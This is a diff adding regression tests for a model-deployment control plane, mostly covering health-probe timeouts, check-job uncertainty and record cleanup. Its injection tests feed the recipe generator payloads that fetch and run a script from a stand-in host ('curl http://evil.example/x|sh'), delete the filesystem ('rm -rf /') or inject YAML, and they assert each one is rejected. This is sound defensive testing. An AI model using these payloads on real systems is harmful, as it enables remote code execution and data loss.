@@ -77,8 +77,14 @@ class FakeRegistry:
         return [n for n in self._nodes.values() if n.healthy]
 
     def set_memory_pct(self, node_id: str, pct: float) -> None:
+        """*pct* of `addressable_memory` -- M-13: that is the denominator the
+        manager's pressure watch now shares with the gateway's admission
+        controller, not the nameplate `total_memory` (they disagree on GB10:
+        addressable 119.7 GiB < total 128 GiB). Setting against total here
+        would silently test a different fraction than the manager computes.
+        """
         node = self._nodes[node_id]
-        node.memory_used = int(node.profile.total_memory * pct / 100.0)
+        node.memory_used = int(node.profile.addressable_memory * pct / 100.0)
 
     def set_healthy(self, node_id: str, healthy: bool) -> None:
         self._nodes[node_id].healthy = healthy
@@ -101,6 +107,9 @@ class FakeAdapter(SparkrunAdapter):
         self.log_tail = ""
         self.stop_confirms = True
         self._counter = 0
+        # M-16: cluster ids whose check-job a wedged host cannot answer.
+        # is_running() must read this as unknown (None), not as False.
+        self.unknown: set[str] = set()
 
     def available(self) -> bool:
         return True
@@ -131,6 +140,8 @@ class FakeAdapter(SparkrunAdapter):
         )
 
     def check_job(self, cluster_id, *, hosts=None, timeout=60.0):
+        if cluster_id in self.unknown:
+            return {"running": None, "cluster_id": cluster_id, "error": "check-job timed out"}
         return {"running": cluster_id in self.running, "cluster_id": cluster_id}
 
     def stop(self, cluster_id, *, hosts=None):
@@ -395,6 +406,272 @@ def test_materialize_is_atomic_and_idempotent(tmp_path):
 
 
 # ==========================================================================
+# Acceptance: recipe content is not a place an attacker-controlled string
+# gets to write YAML structure. M-22.
+# ==========================================================================
+
+
+def test_a_newline_in_model_id_is_rejected_not_injected(tmp_path):
+    """A newline-bearing model_id must not reach the recipe file at all --
+    it could otherwise open a new top-level key, including command:, in a
+    file sparkrun executes."""
+    import dataclasses
+
+    hostile = dataclasses.replace(
+        fx.GPT_OSS_120B,
+        model_id="openai/gpt-oss-120b\ncommand: |\n  rm -rf /",
+    )
+    with pytest.raises(ValueError, match="model_id"):
+        synthesize(
+            hostile, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
+            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+        )
+    # synthesize is pure -- it never got the chance to hand a RecipeSpec to
+    # materialize, so nothing was ever written for this launch to run.
+    assert list(tmp_path.glob("*.yaml")) == []
+
+
+def test_a_newline_in_served_name_is_rejected_not_injected(tmp_path):
+    with pytest.raises(ValueError, match="served_name"):
+        synthesize(
+            fx.GPT_OSS_120B, fx.pp2_plan(), "vllm", 65536, 512,
+            "gpt-oss-120b\ncommand: |\n  curl evil.example | sh",
+            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+        )
+    assert list(tmp_path.glob("*.yaml")) == []
+
+
+def test_shell_metacharacters_are_rejected_even_though_the_yaml_is_valid(tmp_path):
+    """The other half of M-22. sparkrun injects the recipe's model: into the
+    substitution namespace (core/recipe.py, base.setdefault("model", ...)),
+    substitutes it into {model}, and the executor runs the rendered command
+    under bash -c in a container its own defaults make privileged with host
+    networking. This payload carries no newline, no control character, and a
+    harmless leading letter -- so every YAML check passes and it would have
+    executed."""
+    import dataclasses
+
+    hostile = dataclasses.replace(
+        fx.GPT_OSS_120B,
+        model_id="openai/gpt-oss-120b;curl http://evil.example/x|sh",
+    )
+    with pytest.raises(ValueError, match="model_id"):
+        synthesize(
+            hostile, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
+            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+        )
+    assert list(tmp_path.glob("*.yaml")) == []
+
+
+@pytest.mark.parametrize(
+    "field,value",
+    [
+        ("model_id", "org/name;id"),
+        ("model_id", "org/name$(id)"),
+        ("model_id", "org/name`id`"),
+        ("model_id", "org/name&&touch /tmp/pwned"),
+        ("model_id", "org/name|sh"),
+        ("model_id", "org/name {model}"),  # would re-expand: substitution is a fixpoint loop
+        ("served_name", "name;curl evil.example|sh"),
+        ("served_name", "name with spaces"),
+    ],
+)
+def test_command_unsafe_strings_are_rejected(tmp_path, field, value):
+    import dataclasses
+
+    shape = fx.GPT_OSS_120B
+    served = "gpt-oss-120b"
+    if field == "model_id":
+        shape = dataclasses.replace(shape, model_id=value)
+    else:
+        served = value
+    with pytest.raises(ValueError, match=field):
+        synthesize(
+            shape, fx.pp2_plan(), "vllm", 65536, 512, served,
+            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+        )
+    assert list(tmp_path.glob("*.yaml")) == []
+
+
+@pytest.mark.parametrize(
+    "model_id",
+    [
+        "openai/gpt-oss-120b",
+        "meta-llama/Llama-3.3-70B-Instruct",
+        "deepseek-ai/DeepSeek-V3",
+        "org.name/model_v1.0-instruct",
+        "TheBloke/Llama-2-7B-Chat-GGUF:Q4_K_M",  # quant tag colon
+        "Qwen/Qwen3-30B-A3B",
+    ],
+)
+def test_real_model_ids_still_synthesize(tmp_path, model_id):
+    """The command grammar is an allowlist, so it has to be checked against
+    real ids or it silently becomes a denial of service on valid input."""
+    import dataclasses
+
+    shape = dataclasses.replace(fx.GPT_OSS_120B, model_id=model_id)
+    recipe = synthesize(
+        shape, fx.pp2_plan(), "vllm", 65536, 512, "gpt-oss-120b",
+        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+    )
+    assert "model: %s\n" % model_id in recipe.content
+
+
+@pytest.mark.parametrize(
+    "field,value",
+    [
+        ("model_id", "org/name\r\ncommand: evil"),  # bare CR
+        ("model_id", "org/name\x00hidden"),  # NUL, a control character
+        ("model_id", "- looks-like-a-sequence-item"),  # leading dangerous token
+        ("model_id", "#not-a-comment-but-could-be-read-as-one"),
+        ("model_id", ""),  # empty
+        ("served_name", "\tindented-with-a-control-char"),
+    ],
+)
+def test_yaml_unsafe_strings_are_rejected(tmp_path, field, value):
+    import dataclasses
+
+    shape = fx.GPT_OSS_120B
+    served_name = "gpt-oss-120b"
+    if field == "model_id":
+        shape = dataclasses.replace(shape, model_id=value)
+    else:
+        served_name = value
+    with pytest.raises(ValueError):
+        synthesize(
+            shape, fx.pp2_plan(), "vllm", 65536, 512, served_name,
+            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+        )
+
+
+@pytest.mark.parametrize(
+    "model_id",
+    [
+        "meta-llama/Llama-3.3-70B-Instruct",
+        "openai/gpt-oss-120b",
+        "deepseek-ai/DeepSeek-V3",
+        "TheBloke/Llama-2-7B-Chat-GGUF:Q4_K_M",  # quant-tag colon
+        "org.name/model_v1.0-instruct",  # dots and underscores
+    ],
+)
+def test_legitimate_hf_ids_are_not_rejected(tmp_path, model_id):
+    """Slashes, dots, dashes, underscores, and a non-leading colon are all
+    real HuggingFace-id syntax and must keep working."""
+    import dataclasses
+
+    shape = dataclasses.replace(fx.GPT_OSS_120B, model_id=model_id)
+    recipe = synthesize(
+        shape, fx.pp2_plan(), "vllm", 65536, 512, "served-name",
+        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+    )
+    assert "model: %s\n" % model_id in recipe.content
+
+
+@pytest.mark.parametrize(
+    "model_id",
+    [
+        "/data/models/Llama-3.3-70B-Instruct",  # local dir, resolver.py:177
+        "~/models/llama",  # home-relative, as resolver.py:75 would expand it
+        "/data/models/local.gguf",  # local .gguf file, resolver.py:82-90
+        "./relative/model-dir",  # a relative local dir is legal Path syntax too
+    ],
+)
+def test_local_path_model_ids_still_synthesize(tmp_path, model_id):
+    """M-22 regression: resolver.py resolves a local directory or a local
+    .gguf file by handing its path straight through as ModelShape.model_id
+    (see resolver.py's docstring: "a model id, a local directory, or a local
+    .gguf file"), including an absolute path. An earlier version of the
+    command-safety allowlist anchored the first character to alnum, which
+    rejected every one of these -- a real, previously-supported capability,
+    not a hypothetical one (test_resolver.py exercises the local-.gguf path
+    with an absolute tmp_path). None of these characters are outside what
+    the grammar already allowed elsewhere in the string; only the leading
+    position was too strict.
+    """
+    import dataclasses
+
+    shape = dataclasses.replace(fx.GPT_OSS_120B, model_id=model_id)
+    recipe = synthesize(
+        shape, fx.pp2_plan(), "vllm", 65536, 512, "served-name",
+        port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+    )
+    assert "model: %s\n" % model_id in recipe.content
+
+
+@pytest.mark.parametrize(
+    "model_id",
+    [
+        "/data/models/x;curl http://evil.example|sh",
+        "/data/models/x$(id)",
+        "/data/models/x && touch /tmp/pwned",
+        "~/models/x`id`",
+    ],
+)
+def test_path_shaped_command_unsafe_strings_are_still_rejected(tmp_path, model_id):
+    """The other direction of the M-22 local-path fix: widening the leading
+    character class to admit '/', '.', and '~' must not smuggle a shell
+    metacharacter in behind a harmless-looking path prefix. Every one of
+    these starts with a character the grammar now allows to lead, and would
+    still reach the command template as {model} if not rejected."""
+    import dataclasses
+
+    shape = dataclasses.replace(fx.GPT_OSS_120B, model_id=model_id)
+    with pytest.raises(ValueError, match="model_id"):
+        synthesize(
+            shape, fx.pp2_plan(), "vllm", 65536, 512, "served-name",
+            port=8100, gpu_memory_utilization=0.9, recipe_dir=tmp_path,
+        )
+    assert list(tmp_path.glob("*.yaml")) == []
+
+
+# ==========================================================================
+# Acceptance: M-22's identifier check gates DeploymentManager.launch()
+# synchronously -- before any record or worker thread exists -- not only
+# synthesize() on the async launch worker's thread.
+# ==========================================================================
+
+
+def test_launch_refuses_a_hostile_model_id_before_creating_any_record(tmp_path):
+    import dataclasses
+
+    manager = make_manager(tmp_path)
+    hostile = dataclasses.replace(
+        fx.GPT_OSS_120B,
+        model_id="openai/gpt-oss-120b;curl http://evil.example/x|sh",
+    )
+    with pytest.raises(ValueError, match="model_id"):
+        manager.launch(hostile, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
+    # Refused synchronously: no LAUNCHING record was ever created for the
+    # async launch worker to later flip to FAILED.
+    assert manager.list() == []
+    manager.close()
+
+
+def test_launch_refuses_a_hostile_served_name_before_creating_any_record(tmp_path):
+    manager = make_manager(tmp_path)
+    with pytest.raises(ValueError, match="served_name"):
+        manager.launch(
+            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
+            served_name="name\ncommand: |\n  rm -rf /",
+        )
+    assert manager.list() == []
+    manager.close()
+
+
+def test_launch_accepts_a_local_path_model_id(tmp_path):
+    """The other direction, through the same synchronous gate: a local-path
+    model_id (see test_local_path_model_ids_still_synthesize) must still be
+    launchable, not just still synthesizable."""
+    import dataclasses
+
+    manager = make_manager(tmp_path)
+    local = dataclasses.replace(fx.GPT_OSS_120B, model_id=str(tmp_path / "local-model"))
+    deployment = manager.launch(local, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
+    assert deployment.state is S.LAUNCHING
+    manager.close()
+
+
+# ==========================================================================
 # Acceptance: an illegal state transition raises rather than silently
 # correcting.
 # ==========================================================================
@@ -527,10 +804,162 @@ def test_killing_a_backend_fails_the_deployment_with_a_useful_error(tmp_path):
 
 
 def test_death_within_the_fifteen_second_bar():
-    """At the shipped poll interval, threshold misses land inside 15s."""
+    """At the shipped poll interval, threshold misses land inside 15s.
+
+    This is necessary but not sufficient: it assumes an instant probe. See
+    test_hanging_health_endpoint_still_fails_within_fifteen_seconds below for
+    the M-15 case this arithmetic alone does not cover.
+    """
     from control_plane.deploy.manager import HEALTH_FAIL_THRESHOLD, POLL_INTERVAL_S
 
     assert POLL_INTERVAL_S * HEALTH_FAIL_THRESHOLD <= 15.0
+
+
+def _start_hanging_server():
+    """A real listening socket that accepts a TCP connection and then never
+    writes a response, so a client using the real health.probe() genuinely
+    blocks until *its own* timeout expires -- deliberately not a fake that
+    resolves instantly, or a test built on it would not distinguish the fix
+    from the bug. Returns (hang_port, stop_event, acceptor_thread); the
+    caller must set() the event and join() the thread when done.
+    """
+    import socket as _socket
+    import threading as _t
+
+    server = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
+    server.bind(("127.0.0.1", 0))
+    server.listen(64)
+    hang_port = server.getsockname()[1]
+    stop_accepting = _t.Event()
+
+    def accept_and_hang():
+        while not stop_accepting.is_set():
+            server.settimeout(0.1)
+            try:
+                conn, _ = server.accept()
+            except OSError:
+                continue
+            conn.settimeout(60.0)  # hold it open; never write a response
+
+    acceptor = _t.Thread(target=accept_and_hang, daemon=True)
+    acceptor.start()
+    return hang_port, stop_accepting, acceptor, server
+
+
+def test_hanging_health_endpoint_still_fails_within_fifteen_seconds(tmp_path):
+    """M-15: a HANGING health endpoint (not a fast refusal) costs up to
+    ~6s per probe at the default per-path timeout -- two consecutive misses
+    would then run ~22s worst case, blowing the 15s acceptance bar even
+    though test_death_within_the_fifteen_second_bar's arithmetic looks fine.
+    The manager must derive a tighter per-path probe timeout from the poll
+    cycle so the wall-clock bound holds even when every probe hangs.
+
+    The clock starts *before* the leading poll interval the real watch loop
+    always pays first -- _watch_loop ticks, then waits poll_interval_s, then
+    ticks again, so the true worst case (from the instant a healthy backend
+    goes silent) is poll_interval_s + probe_time, twice, not just the second
+    half of that. Starting the clock only at the first tick call understates
+    the real bound by one full poll_interval_s.
+    """
+    hang_port, stop_accepting, acceptor, server = _start_hanging_server()
+    from control_plane.deploy.health import probe as real_probe
+
+    hanging = {"on": False}
+
+    def probe_fn(backend_url, timeout=3.0):
+        if not hanging["on"]:
+            return True, None
+        # Real socket connect + read against the hanging server above,
+        # bounded only by *timeout* -- exercises the same code path
+        # health.probe() uses, with the manager's derived timeout forwarded.
+        return real_probe("http://127.0.0.1:%d/v1" % hang_port, timeout=timeout)
+
+    try:
+        manager = make_manager(tmp_path, probe=probe_fn)
+        deployment = manager.launch(
+            fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256
+        )
+        assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)
+
+        hanging["on"] = True
+        start = time.monotonic()
+        time.sleep(manager.poll_interval_s)  # the leading wait _watch_loop always pays
+        manager.tick()
+        assert manager.get(deployment.deployment_id).state is S.READY  # one miss so far
+        time.sleep(manager.poll_interval_s)
+        manager.tick()
+        elapsed = time.monotonic() - start
+
+        live = manager.get(deployment.deployment_id)
+        assert live.state is S.FAILED, live.last_error
+        assert elapsed <= 15.0, "hanging probe blew the 15s death bound: %.1fs" % elapsed
+        manager.close()
+    finally:
+        stop_accepting.set()
+        acceptor.join(timeout=2.0)
+        server.close()
+
+
+def test_hanging_health_endpoints_still_fail_within_fifteen_seconds_at_scale(tmp_path):
+    """M-15, the compounding half the single-deployment test above cannot
+    exercise: an earlier fix derived the per-path timeout as
+    budget_per_tick / watched_count / len(HEALTH_PATHS), floored by
+    MIN_PROBE_TIMEOUT_S. Past watched_count = budget_per_tick /
+    MIN_PROBE_TIMEOUT_S (6, at the shipped constants) the floor won and the
+    *serial* total across all watched deployments grew unboundedly with
+    watched_count instead of staying flat -- 16s at 6 deployments, 30s at
+    20, worse than the ~22s the original bug produced. tick() must probe
+    every deployment's backend concurrently so the wall-clock cost of a tick
+    stays roughly constant as watched_count grows past that point. Eight
+    deployments, all hanging on the same real socket at once, is comfortably
+    past the n=6 threshold where the old arithmetic broke.
+    """
+    hang_port, stop_accepting, acceptor, server = _start_hanging_server()
+    from control_plane.deploy.health import probe as real_probe
+
+    hanging = {"on": False}
+
+    def probe_fn(backend_url, timeout=3.0):
+        if not hanging["on"]:
+            return True, None
+        return real_probe("http://127.0.0.1:%d/v1" % hang_port, timeout=timeout)
+
+    try:
+        manager = make_manager(tmp_path, probe=probe_fn)
+        deployments = [
+            manager.launch(
+                fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256,
+                served_name="model-%d" % i,
+            )
+            for i in range(8)
+        ]
+        for d in deployments:
+            assert wait_for(
+                lambda d=d: manager.get(d.deployment_id).state is S.READY
+            )
+
+        hanging["on"] = True
+        start = time.monotonic()
+        time.sleep(manager.poll_interval_s)  # the leading wait _watch_loop always pays
+        manager.tick()
+        for d in deployments:
+            assert manager.get(d.deployment_id).state is S.READY  # one miss so far
+        time.sleep(manager.poll_interval_s)
+        manager.tick()
+        elapsed = time.monotonic() - start
+
+        for d in deployments:
+            live = manager.get(d.deployment_id)
+            assert live.state is S.FAILED, live.last_error
+        assert elapsed <= 15.0, (
+            "hanging probes across 8 watched deployments blew the 15s "
+            "death bound: %.1fs" % elapsed
+        )
+        manager.close()
+    finally:
+        stop_accepting.set()
+        acceptor.join(timeout=2.0)
+        server.close()
 
 
 def test_backend_dying_during_startup_fails_the_launch(tmp_path):
@@ -543,6 +972,36 @@ def test_backend_dying_during_startup_fails_the_launch(tmp_path):
 
     assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.FAILED)
     assert "exited during startup" in manager.get(deployment.deployment_id).last_error
+    manager.close()
+
+
+def test_an_unanswering_check_job_does_not_instantly_fail_a_launch(tmp_path):
+    """M-16: check-job returning unknown (e.g. it timed out on a wedged
+    host) must not be read as "not running" -- that would kill a launch
+    that may still be loading, exactly like test_backend_dying_during_
+    startup_fails_the_launch above but for a host that never actually died.
+    """
+    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
+    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
+    probe = FakeProbe(healthy_by_default=False)  # backend not answering yet
+    manager = DeploymentManager(
+        adapter, registry, state_dir=tmp_path, probe_fn=probe,
+        autostart=False, ready_poll_interval_s=0.01, ready_timeout_s=5.0,
+    )
+    deployment = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
+    assert wait_for(lambda: manager.adapter.running)
+    cluster_id = next(iter(adapter.running))
+    adapter.unknown.add(cluster_id)  # check-job now times out for this cluster
+
+    # Several ready-poll cycles all coming back "unknown": still LAUNCHING.
+    time.sleep(0.05)
+    assert manager.get(deployment.deployment_id).state is S.LAUNCHING
+
+    # The host answers again and the backend finishes loading: it recovers,
+    # proving the waiter kept going rather than having declared it dead.
+    adapter.unknown.discard(cluster_id)
+    probe.healthy_by_default = True
+    assert wait_for(lambda: manager.get(deployment.deployment_id).state is S.READY)
     manager.close()
 
 
@@ -826,6 +1285,71 @@ def test_restart_adopts_a_deployment_that_is_still_loading(tmp_path):
     second.close()
 
 
+def test_reconcile_does_not_retire_a_deployment_on_a_wedged_check_job(tmp_path):
+    """M-16: check_job timing out on restart is 'sparkrun could not answer',
+    not 'the workload is gone'. Collapsing that TIMEOUT into `running: False`
+    used to make reconcile() retire a deployment that might still be alive
+    on a wedged host -- it must instead adopt it as LAUNCHING, the same
+    conservative outcome as backend-silent-but-container-up above."""
+    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
+    first = make_manager(tmp_path, registry=registry)
+    deployment = first.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
+    assert wait_for(lambda: first.get(deployment.deployment_id).state is S.READY)
+    live = set(first.adapter.running)
+    first.close()
+
+    adapter = FakeAdapter(registry, recipe_dir=tmp_path / "recipes")
+    adapter.running = set()  # sparkrun cannot confirm a live container either
+    adapter.unknown = set(live)  # ...because check-job times out on this host
+    probe = FakeProbe(healthy_by_default=False)  # backend not answering either
+    second = DeploymentManager(
+        adapter, registry, state_dir=tmp_path, probe_fn=probe,
+        autostart=False, ready_poll_interval_s=0.01, ready_timeout_s=5.0,
+    )
+    adopted = second.reconcile()
+
+    assert [d.state for d in adopted] == [S.LAUNCHING]
+    assert "could not confirm" in second.get(deployment.deployment_id).last_error
+
+    probe.healthy_by_default = True  # the host answers again, model is up
+    assert wait_for(lambda: second.get(deployment.deployment_id).state is S.READY)
+    second.close()
+
+
+def test_reconcile_does_not_retire_a_deployment_when_sparkrun_is_unavailable(tmp_path):
+    """M-16, the other check_job branch: `available()` being False (the
+    sparkrun binary missing or unreachable from this process right now) is
+    also 'we could not check', not 'the workload is gone'. Before this fix,
+    check_job's early return hardcoded {"running": False} whenever
+    available() was False, so a control plane that restarted into an
+    environment temporarily missing the sparkrun binary would retire every
+    live deployment it could not also confirm over HTTP -- the same failure
+    mode as the wedged-check-job test above, reached through the other
+    branch of check_job()."""
+    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
+    first = make_manager(tmp_path, registry=registry)
+    deployment = first.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
+    assert wait_for(lambda: first.get(deployment.deployment_id).state is S.READY)
+    first.close()
+
+    # A real SparkrunAdapter whose binary cannot be found -- available() is
+    # False, exactly like test_check_job_survives_a_missing_sparkrun, now
+    # exercised through reconcile() instead of a direct check_job() call.
+    adapter = SparkrunAdapter(
+        registry, recipe_dir=tmp_path / "recipes", binary="sparkrun-does-not-exist"
+    )
+    probe = FakeProbe(healthy_by_default=False)  # backend not answering either
+    second = DeploymentManager(
+        adapter, registry, state_dir=tmp_path, probe_fn=probe,
+        autostart=False, ready_poll_interval_s=0.01, ready_timeout_s=5.0,
+    )
+    adopted = second.reconcile()
+
+    assert [d.state for d in adopted] == [S.LAUNCHING]
+    assert "could not confirm" in second.get(deployment.deployment_id).last_error
+    second.close()
+
+
 def test_a_relaunch_of_the_same_model_on_the_same_nodes_is_refused(tmp_path):
     manager = make_manager(tmp_path)
     first = manager.launch(fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm", 65536, 256)
@@ -872,6 +1396,70 @@ def test_store_roundtrips_every_contract_field(tmp_path):
     assert restored.fit.reason == original.fit.reason
     assert restored.plan.rejected == original.plan.rejected
     assert handle["cluster_id"] == "sparkrun_abc"
+
+
+# ==========================================================================
+# Low: FAILED/STOPPED records must not accumulate forever. purge_expired()
+# is the terminal-record GC; reconcile() runs it once per restart.
+# ==========================================================================
+
+
+def test_purge_expired_removes_only_old_terminal_records(tmp_path):
+    store = DeploymentStore(tmp_path / "deployments")
+    old_terminal = Deployment(
+        "d-old", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
+        S.STOPPED, None, 4096, 8, None, "torn down",
+    )
+    fresh_terminal = Deployment(
+        "d-fresh", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
+        S.FAILED, None, 4096, 8, None, "crashed",
+    )
+    still_live = Deployment(
+        "d-live", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
+        S.READY, "http://h:8100/v1", 4096, 8, 1.0, None,
+    )
+    old_path = store.save(old_terminal)
+    store.save(fresh_terminal)
+    store.save(still_live)
+    old_time = time.time() - 8 * 24 * 3600  # past the default 7-day window
+    os.utime(old_path, (old_time, old_time))
+
+    removed = store.purge_expired(7 * 24 * 3600.0)
+
+    assert removed == 1
+    remaining = {d.deployment_id for d, _ in store.load_all()}
+    assert remaining == {"d-fresh", "d-live"}
+
+
+def test_purge_expired_leaves_a_terminal_record_inside_the_window(tmp_path):
+    store = DeploymentStore(tmp_path / "deployments")
+    recent = Deployment(
+        "d-recent", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
+        S.STOPPED, None, 4096, 8, None, None,
+    )
+    store.save(recent)
+    assert store.purge_expired(7 * 24 * 3600.0) == 0
+    assert [d.deployment_id for d, _ in store.load_all()] == ["d-recent"]
+
+
+def test_reconcile_garbage_collects_expired_terminal_records(tmp_path):
+    """delete() had zero callers before this; reconcile() is now the one
+    that gives it a job, once per restart, on the shipped retention window."""
+    registry = FakeRegistry(fx.SPARK_01, fx.SPARK_02)
+    store = DeploymentStore(tmp_path / "deployments")
+    old_terminal = Deployment(
+        "d-old", "m", fx.GPT_OSS_120B, fx.pp2_plan(), fx.fits(), "vllm",
+        S.STOPPED, None, 4096, 8, None, "torn down",
+    )
+    old_path = store.save(old_terminal)
+    old_time = time.time() - 8 * 24 * 3600
+    os.utime(old_path, (old_time, old_time))
+
+    manager = make_manager(tmp_path, registry=registry)
+    manager.reconcile()
+
+    assert manager.store.load_all() == []
+    manager.close()
 
 
 # ==========================================================================
@@ -1167,11 +1755,24 @@ def test_missing_sparkrun_fails_with_an_actionable_message(tmp_path):
 
 
 def test_check_job_survives_a_missing_sparkrun(tmp_path):
-    """Reconcile must not blow up when sparkrun is absent."""
+    """Reconcile must not blow up when sparkrun is absent.
+
+    M-16, the ``available()`` branch: this used to assert ``running is
+    False``, i.e. "confirmed not running". That conflated "this process
+    cannot find the sparkrun binary right now" with "the workload is
+    definitely gone" -- the exact bug M-16 flags for the TIMEOUT branch,
+    just reached a different way (a control plane that restarts into an
+    environment temporarily missing the binary would retire every live
+    deployment it could not also reach over HTTP). ``running`` must be
+    None: absence of evidence, not evidence of absence. See
+    test_reconcile_does_not_retire_a_deployment_when_sparkrun_is_unavailable
+    below for the same fix exercised through reconcile().
+    """
     adapter = SparkrunAdapter(recipe_dir=tmp_path, binary="sparkrun-does-not-exist")
     result = adapter.check_job("sparkrun_abc")
-    assert result["running"] is False
+    assert result["running"] is None
     assert "install" in result["error"].lower()
+    assert adapter.is_running("sparkrun_abc") is None
 
 
 # ==========================================================================
@@ -1472,3 +2073,90 @@ def test_image_says_which_variable_moves_a_port_collision():
         assert "Traceback" not in output
     finally:
         holder.close()
+
+
+# ---------------------------------------------------------------------------
+# M-15 arbitration (orchestrator): the probe phase shares ONE absolute
+# deadline, and past MAX_PROBE_WORKERS coverage rotates instead of truncating.
+# ---------------------------------------------------------------------------
+
+
+def _fake_probe_records(n):
+    import types
+
+    return [
+        types.SimpleNamespace(
+            deployment=types.SimpleNamespace(
+                deployment_id="d-probe-%d" % i, backend_url="http://10.0.0.%d:8100/v1" % i
+            )
+        )
+        for i in range(n)
+    ]
+
+
+def test_concurrently_hanging_probes_share_one_absolute_deadline(tmp_path):
+    """Eight probes that genuinely never return must cost ~one hard deadline,
+    not eight: a serial per-thread join would accumulate k * deadline."""
+    import time as _time
+
+    def hanging_probe(backend_url, timeout=3.0):
+        _time.sleep(12)
+        return True, None
+
+    manager = make_manager(tmp_path, probe=hanging_probe)
+    records = _fake_probe_records(8)
+    started = _time.monotonic()
+    results = manager._probe_backends(records, probe_timeout=0.5)
+    elapsed = _time.monotonic() - started
+
+    assert len(results) == 8
+    for ok, detail in results.values():
+        assert ok is False
+        assert "did not return" in detail
+    # hard deadline is probe_timeout * len(HEALTH_PATHS) = ~1s; a serial
+    # join would take >= 8s. Generous margin for thread scheduling.
+    assert elapsed < 4.0, "probe phase accumulated per-thread deadlines: %.2fs" % elapsed
+
+
+def test_probe_rotation_covers_every_deployment_past_the_worker_cap(tmp_path, monkeypatch):
+    """Past MAX_PROBE_WORKERS the window rotates: nothing is permanently
+    unprobed, it is just probed every ceil(n/cap) ticks."""
+    import control_plane.deploy.manager as manager_module
+
+    probed = []
+
+    def recording_probe(backend_url, timeout=3.0):
+        probed.append(backend_url)
+        return True, None
+
+    monkeypatch.setattr(manager_module, "MAX_PROBE_WORKERS", 2)
+    manager = make_manager(tmp_path, probe=recording_probe)
+    records = _fake_probe_records(5)
+
+    per_call = []
+    for _ in range(3):
+        results = manager._probe_backends(records, probe_timeout=1.0)
+        per_call.append(set(results))
+
+    assert all(len(ids) <= 2 for ids in per_call), "window exceeded the cap"
+    covered = set().union(*per_call)
+    assert covered == {r.deployment.deployment_id for r in records}, (
+        "rotation must reach every deployment within ceil(n/cap) ticks"
+    )
+
+
+def test_bare_yaml_null_spellings_are_rejected_as_command_values():
+    """'~', '.' and '..' pass no gate: '~' is YAML null and shell home."""
+    from control_plane.deploy.recipes import _check_command_safe
+
+    for bad in ("~", ".", ".."):
+        with pytest.raises(ValueError):
+            _check_command_safe(bad, "model_id")
+    for good in (
+        "meta-llama/Llama-3.3-70B-Instruct",
+        "/data/models/x.gguf",
+        "~/models/llama",
+        "./relative/model-dir",
+        "a",
+    ):
+        _check_command_safe(good, "model_id")
